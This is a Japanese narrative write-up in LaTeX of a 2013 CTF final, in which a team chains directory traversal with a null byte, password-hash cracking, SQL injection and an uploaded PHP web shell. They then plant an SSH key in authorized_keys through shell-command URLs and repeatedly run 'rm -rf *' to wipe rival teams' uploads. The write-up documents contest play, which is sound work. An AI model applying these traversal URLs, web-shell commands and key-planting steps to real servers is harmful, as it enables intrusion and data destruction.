運営の注意などが終わり、競技は開始された。

俺は直ちに問題サーバーへとアクセスする。
問題は\Mercuryというものが一問のみ。
まあ、従来と同じように時間の経過と共に問題が追加されてゆく形式なのであろう。

とりあえず問題には「FLAGページ」と書かれた\url{http://10.2.0.3/FLAG}というURL、
そして「キーワード」という入力フォームが用意されている。
とにかく\url{http://10.2.0.3/FLAG}へアクセスしてみる。

何も書かれていない白紙ファイル。
なるほど、何かの手段を用いてここにチームごとに定められた「フラッグワード」を書き込めば得点になるのだろう。
フラッグワードは指定のページで公開されており、
\ctt{c886eeb9dcd32}……というハッシュ値を連想させるような、
全部で64桁の文字列となっている。
我々は\urandomだが、
他チームに割り当てられたフラッグワードも合わせて公開されているようだ。
まあ、他チームのフラッグワードを書き込む意味などなかろうから、
別にこれはどうでもいい。

で、解くべき問題はどれだ。
とりあえず、\url{http://10.2.0.3/}へアクセスしてみると、
ドキュメントルートに置かれたファイルが見える。

\begin{itembox}[c]{\textbf{Index of /}}
\small
\begin{table}[H]
	\footnotesize
	\begin{tabular}{lcrl}
		\hfill Name & Last modified & Size & Description \\
		\hline
		eng.txt & 12-Feb-2013 16:39 & 16 \\
		jpn.txt & 12-Feb-2013 17:10 & 31 \\
		stage2/ & 12-Feb-2013 17:49 & -  \\
		stage1.cgi & 12-Feb-2013 17:23 & 834 \\
		\hline
	\end{tabular}
\end{table}
\textit{Apache/2.2.15 (CentOS) Server at localhost Port 80}
\end{itembox}

Apacheのファイル一覧が露呈している。
とりあえず、\ctt{stage2}というフォルダを覗いてみるか。
\url{http://10.2.0.3/stage2/}へアクセスすると、BASIC認証が出現した。
なるほどこのBASIC認証を突破するために、
脆弱性があるであろう\ctt{stage1.cgi}を用いるということだろう。

\url{http://10.2.0.3/stage1.cgi}へアクセスすると、日本語と英語が切り替えられるだけのページが出現した。

\lstinputlisting[style=html]{src/2/stage1.cgi.html}

試しに英語へ切り替えると、
JavaScriptか何かが走り自動的に
\url{http://10.2.0.3/stage1.cgi?lang=eng}というアドレスへ移動した。
つまり\ctt{lang}クエリでファイル名を渡しているだけの、
典型的なディレクトリトラバーサルの問題だ。
\url{http://10.2.0.3/stage1.cgi?lang=./stage2/.htpasswd}でOK。

\begin{lstlisting}
File not found. [./stage2/.htpasswd.txt]
\end{lstlisting}

くそ、尻に\ctt{.txt}を付与するタイプか。
ならばヌルバイト攻撃だろう。
\url{http://10.2.0.3/stage1.cgi?lang=./stage2/.htpasswd%00}でよい。

\lstinputlisting{src/2/.htpasswd}

うっ、暗号化されてる……。
もう駄目だ、おーぴーを使うしかない。

「おーぴー行けたか?ヌルバイト攻撃だ」

「ぉぅぃぇ!」

おーぴーの画面にも、同じ文字列が表示された。
さて、ここからどうしたものか。

「John The Ripper\footnote{総当たりと辞書攻撃によるパスワードクラックツール。}を使おう」

は?Joho The Ripperだと?
確かにこいつはどう見てもハッシュ値、復号化は無理。
となれば、John The Ripperということになるが……。
こんなことしている時間なんてあるのか?

そんなことをしている間にサイレン音が会場に響く。
このサイレンは、つくば大会同様、
どこかのチームが得点する度に鳴る仕組みになっているらしい。
また大会側が用意している「スコアサーバー」へアクセスすれば、
どのチームがどの問題をクリアしているか、
そしてどのチームが現在何ポイント所持しているのかという情報が手に入るようになっている。
どこのチームが得点したのか知らないが、
こんなに早くも解決しているところを鑑みるに到底John The Ripperとは思えない。

とりあえず、このハッシュ値をGoogleで調べてみよう。
あわよくば出てくるかもしれない。
一旦大会用の回線を切断し、携帯電話を使ってインターネットに接続する。
そしてハッシュ値をそのままGoogleの検索フォームに叩き込む。
が、ダメ。検索結果はゼロ件。

すると、横にいたゆにゃ\footnote{情報科学類二年次、AC部屋勢。}が話しかけてくる。
彼は横浜大会から参加することになったメンバーで、
競技プログラミングやアルゴリズムに精通している。

「おーぴーはパスワードが分ったらしい」

まじかよ。

「パスワードは\ctt{222222}」

なるほどね。
とりあえず\ctt{stage2}へ進むと、

\begin{screen}
\centering
\textbf{Stage2 Keyword:} JohnTheRipperIsMyFriend 
\end{screen}

と表示されたページが現れる。
なるほど、これがコミットすべきキーワードか。
まあ、これのコミットは既におーぴーか誰かがやったのだろう。
そしてページ中央には検索フォームと謎の表。

\begin{table}[H]
	\centering
	\begin{tabular}{|c|c|c|}
		\hline
		\textbf{No} & \textbf{ユーザ名} & \textbf{パスワード} \\ \hline
		1 & keigo & ******** \\ \hline
		2 & seccon & ********* \\ \hline
		3 & stage3 & *********** \\ \hline
	\end{tabular}
\end{table}

ああ、これは明らかにSOLインジェクションだ。
つくば大会と同様に\ctt{UNION}を流すタイプ。
テーブル名は……そうだ、さっきの\ctt{stage1.cgi}を使えばソースが見える。

「吉村君、今どこ?」

おーぴーが問う。

「今\ctt{stage2}、SQLインジェクションで------」

「それは今解いた、次は\ctt{stage3xYz}へ進んで」

マジかよおーぴー。
つくば大会の時はSQLなんてからきしだったのに。
まあいいや、とりあえず次だ。
\url{http://10.2.0.3/stage3xYz/}へ進む。

\lstinputlisting[style=html]{src/2/stage3.html}

キーワードは\textit{IamSQLInjectionMaster}らしい。
これも既におーぴーがコミットしたようだ。
次は画像のアップローダーと思しきプログラムだ。

手始めにデスクトップに置いてあった\ctt{latex.ltx}をアップロードしてみるか。

\begin{screen}
\centering
latex.ltxをアップロードしました。
\end{screen}

直ちにアップロードが完了し、画像ではない\ctt{latex.ltx}が、
\url{http://10.2.0.3/stage3xYz/images/latex.ltx}というURLでアップロードされてしまった。
よし、名前もそのままらしいな。

ということで、直ちにスクリプトを書く。

\lstinputlisting[style=php]{src/2/attack.php}

これを\ctt{gomi.php}などと適当なPHPファイルとして設置すれば、
あらゆるOSコマンドを動かすことが出来るようになる。

\begin{screen}
\centering
gomi.phpをアップロードしました。
\end{screen}

「おーぴー、\ctt{images}に\ctt{gomi.php}をアップした。
これで任意のOSコマンドを使える」

さて、とりあえず\ctt{stage3xYz}を\ctt{ls}してみるか。
\url{http://10.2.0.3/stage3xYz/images/gomi.php?cmd=ls ../}を実行してみよう。

\begin{lstlisting}
HINT-1:_Use_SSH
HINT-2:_Append_Only
images
index.php
index.php
\end{lstlisting}

\ctt{HINT1:\_Use\_SSH}?なんだこれは?
まあとりあえず、\ctt{FLAG}を見てみるか。

\url{http://10.2.0.3/stage3xYz/images/gomi.php?cmd=ls ../../}へアクセス。

\begin{lstlisting}
FLAG
eng.txt
index.html
jpn.txt
stage1.cgi
stage2
stage3xYz
stage3xYz
\end{lstlisting}

なるほどね。
最初に見えたApacheのファイル一覧みたいなものは、
単に見た目をそっくりに偽装した\ctt{index.html}が置いてあっただけか。

さて、FLAGのパーミッションは確認した方がいいな。
\url{http://10.2.0.3/stage3xYz/images/gomi.php?cmd=ls -al ../../}だ。

\lstinputlisting[xleftmargin=1pt, basicstyle=\fontsize{6pt}{15pt}\tt]{src/2/lsDocRoot.txt}

なるほど、\ctt{stage5}になれば\ctt{FLAG}に書けるってわけか。

しかし先ほどのヒント、「Use\_SSH」とはどういうことなのだろうか。
SSHでログインするにしても、ユーザー名も分からぬこの状況ではどうしようもない……。
いや、今この\ctt{gomi.php}を実行しているユーザーならば特定出来る。
\url{http://10.2.0.3/stage3xYz/images/gomi.php?cmd=id}だ。

\begin{lstlisting}
uid=502(stage4) gid=502(stage4) groups=502(stage4),0(root) uid=502(stage4) gid=502(stage4) groups=502(stage4),0(root) 
\end{lstlisting}

よし、俺は\ctt{stage4}だ。
ならば、

「おーぴー、\ctt{id}が\ctt{stage4}だ。\ctt{authorized\_keys}を------」

そこまで言ったところで全てを察したおーぴーは直ちに作業へと戻った。
ならば俺も作業開始だ。
\ctt{id}が\ctt{stage4}であるということは、
\ctt{stage4}の\ctt{authorized\_keys}に俺の公開鍵を書き込めば
そのまま\url{stage4@10.2.0.3}へログイン出来る可能性が高い。

まずは適当な鍵を生成せねば。

\begin{lstlisting}
$ ssh-keygen -f ~/.ssh/id_rsa.gomi
\end{lstlisting}

そして、公開鍵\ctt{id\_rsa.gomi.pub}を\ctt{gomi.php}から書き込めばいい。
つまり、

\end{multicols}

\begin{lstlisting}
http://10.2.0.3/stage3xYz/images/gomi.php?cmd=echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBQ/02G1jx0M
6Fw7ybYhKuMNlDrG/6sFyifFWO+XdmowzSj+L4Ip4LpZer1xCINJWJpcGGeIy1JqcoXDagA70yqWWO9qcstCdSKIlhCBxD78VBS6+f
tvHXpmM7818npSKGy0yeKaajNIEYQYKUGVYVDcLKWEFXY2utDd2wV3M2BRsEZZyu7jlBOqtfEeQbou3so36lIipM4FAWaZGzcNtnN4
0xfQLG1twuDTvxYINqTwbezRueYQXghIWTrD3fyWEDH86BsaQ6oN68XD0sscHuI4IC3/R19afZKiti8mHqwmC5JODpZ2McUGzwZIqm
55c/h83YP1izckJqaKW7pg9V yoshimura_yuu@yoshimura-yuu.local" >> /home/stage4/.ssh/authorized_keys
\end{lstlisting}

\begin{multicols}{2}

へアクセスすればいい。
そして、

\begin{lstlisting}
$ ssh -i ~/.ssh/id_rsa.gomi stage4@10.0.2.3
\end{lstlisting}

とすればログイン出来るはず。

\begin{lstlisting}
Permission denied.
\end{lstlisting}

うっ……!マジか。
この方針、不味かったか?

「おーぴー、\ctt{stage4}でログイン出来た?」

「ぉぅぃぇ!」

なんだと……。
ということは、俺の書いた\ctt{authorized\_keys}が不正?
とりあえず\url{http://10.2.0.3/stage3xYz/images/gomi.php?cmd=cat /home/stage4/.ssh/authorized_keys}
で中身を確認するか。

\end{multicols}

\lstinputlisting{src/2/authorized_keys1}

\begin{multicols}{2}

うっ、しまった。
\ctt{+}がURLエンコードでスペースになってしまったのか。
\ctt{+}はええと、Perlで調べるか。

\begin{lstlisting}
$ perl -MURI::Escape -E 'say uri_escape("+")'
%2B
\end{lstlisting}

どうやら\ctt{+}は\ctt{\%2B}であると分った。
後はさっきの\ctt{id\_rsa.gomi.pub}の\ctt{+}を\ctt{\%2B}へ置換したものを流し込めばよい。
この程度の置換であれば、Vimの機能で一撃だ。

\end{multicols}

\begin{lstlisting}
http://10.2.0.3/stage3xYz/images/gomi.php?cmd=echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBQ/02G
1jx0M6Fw7ybYhKuMNlDrG/6sFyifFWO%2BXdmowzSj%2BL4Ip4LpZer1xCINJWJpcGGeIy1JqcoXDagA70yqWWO9qcstCdSKI
lhCBxD78VBS6%2BftvHXpmM7818npSKGy0yeKaajNIEYQYKUGVYVDcLKWEFXY2utDd2wV3M2BRsEZZyu7jlBOqtfEeQbou3so
36lIipM4FAWaZGzcNtnN40xfQLG1twuDTvxYINqTwbezRueYQXghIWTrD3fyWEDH86BsaQ6oN68XD0sscHuI4IC3/R19afZKi
ti8mHqwmC5JODpZ2McUGzwZIqm55c/h83YP1izckJqaKW7pg9V yoshimura_yuu@yoshimura-yuu.local" >> 
/home/stage4/.ssh/authorized_keys
\end{lstlisting}

\begin{multicols}{2}

でいいはずだ。
そして二回目の、

\begin{lstlisting}
$ ssh -i ~/.ssh/id_rsa.gomi stage4@10.0.2.3
\end{lstlisting}

トライ。

\begin{lstlisting}
Last login: Sat Feb 23 10:02:40 2013

Stage4 Keyword: IcouldLoginWithSSHd

[satge4@localhost ~]$
\end{lstlisting}

勝った。
このキーワードは既におーぴーがコミットしたらしい。
しかし謎なのは、

「おーぴー、どうやって\ctt{authorized\_keys}に書き込んだ?」

「Fiddler\footnote{プロクシのように振る舞うWebデバッガー。}を使った」

なるほど。
俺みたいに文字列を直接アドレスバーに入力するような古典的手法はもうダメってことだな。
まあともかく、これで俺もサーバーの住人だ。

しかし、SSHでログインしているのは俺とおーぴーだけ。
チームの全員でこのサーバーを調べた方が良いだろう。
とりあえず、他のメンバーに手早く\ctt{gomi.php}の使い方を説明した。

まあ、事前にCOINSの環境でこの話はしたことがある。
COINSの環境はPHPが\ctt{\_www}の権限で動いているので、
PHPから、つまりはApacheから参照出来る情報は全て他のユーザーが取得出来る。
故に、PHPがデータベースにアクセスするための情報や、
Apacheの設定ファイルである\ctt{.htpasswd}なども閲覧出来る。
という話を\urandomの皆には事前にしてあるので、これはCOINS環境の応用問題だ。
簡単に分かるはず。

しかし、

「\ctt{gomi.php}でInternal Server Error出るんだけど……」

おしろが言う。
どういうことだ?
とにかく調べてみるか。
ドキュメントルートはどこだか不明だが、
まあ恐らく\ctt{/var/www/}の下の何処か。
ここで\ctt{ls}を発砲。

\begin{lstlisting}
[stage4@localhost ~]$ cd /var/www
[stage4@localhost www]$ ls
DB  cgi-bin  error  html  icons
\end{lstlisting}

この中でドキュメントルートである可能性が最も高そうなのは\ctt{html}だ。
となると、\ctt{gomi.php}があるのは\ctt{html/stage3xYz/image/}ということだ。
とりあえずそこで\ctt{ls}を撃つ。

\begin{lstlisting}
[stage4@localhost images]$ ls
gomi.php index.html a.php hogehoge.cgi key.png test.php gomi.php attack.php 
\end{lstlisting}

なんだこれは?
俺がアップロードした覚えのないファイルが大量に……。
おーぴーなどが適当にアップロードしたにしては流石に多過ぎだ。
もしかして、これ、あらゆるチームが同じサーバーへ攻撃しているのか?
ならば俺のやるべきことは、

\begin{lstlisting}
[stage4@localhost images]$ rm -rf *
rm: cannot remove `index.html': Permission Denied.
\end{lstlisting}

そして、\ctt{ls}を再度。

\begin{lstlisting}
[stage4@localhost images]$ ls
index.html
\end{lstlisting}

よし、ゴミどもは削除した。
この\ctt{index.html}は大会側が用意したものだろうから、
何か強いパーミッションで保護されているに違いない。
それ以外のファイル、例えば\ctt{gomi.php}など、
\ctt{stage4}の権限でなんとか出来るファイルについては全滅だ。

敵チームがこのサーバーへログインするには俺の置いたようなスクリプトを設置し、
\ctt{authorized\_keys}へ公開鍵を書き込む以外にないだろう。
だがここで俺が立て籠り、アップロードされたファイルをことごとく削除したら、
当然敵チームが公開鍵を\ctt{authorized\_keys}へ書き込むのは困難になるだろう。
だからひたすら\ctt{rm -rf *}を連打だ。
これで俺の置いた\ctt{gomi.php}も破滅したが、もはやあんなものは必要ない。
少くとも俺とおーぴーの公開鍵が\ctt{authorized\_keys}に登録されている以上、
我々が残りのメンバーの公開鍵をUSBメモリか何かで受け取り、書き込めばよい。

とりあえず、おしろの公開鍵を登録せねば。
既にログインしていためいす\footnote{情報科学類二年次、クラス代表者の一人。}に事情を話し、
\ctt{rm -rf *}を連打してもらうことにした。
めいすは今回の全国大会から\urandomに参加した人間で、C\#やRubyを使ってプログラムを書く人間だ。

おしろはおーぴーが所持していたUSBメモリに自前の公開鍵を入力して俺に渡す。
それを受けとり、手早く書き込む。

\end{multicols}

\begin{lstlisting}
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDDHqTaybkv0pI53h5HEZxj8Mz0i4SfWIWTp0RpABgyJDloyKCv4YkX3/u1
k4eW4vuDD9wje1zLbnLl3cX/Elvh4NeQ8MMXwZSJqZrShDEpfqkkYlhIVWsNbui9JRSmeTVSbQiJIdb6tc6NYTlyujp/f/5BumqKUn
RY1WE9BNz9sbc6vm4MA1eU33j7HQGD2xYDc7fHks8Fy7NwdDjrfm4CZEpxhrur4HL8CQAEvNAa7xaLWOwqbDxJlo3eVKCtzrCSSje4
HZ41AoNUbHf7PKznv2cwSWP5z5MIfVvvoZsRmtxbVG4UEN0pA578uo8rIRq87z6MZ8LQ7usXweUsGuZr favcasle@ubuntu
>> /home/stage4/.ssh/authorized_keys
\end{lstlisting}

\begin{multicols}{2}

他のメンバーの公開鍵はおーぴーが処理したらしい。
俺はめいすから削除する役割を代ってもらい、
めいすにはこの作業をシェルスクリプトか何かで自動化してもらうことにした。
そして残りのメンバーはFLAGへの書き込みを模索する。

% vimexec: let g:tex_no_math = 0
% vimexec: syntax off
% vimexec: syntax on
% vimexec: source ~/.gvimrc
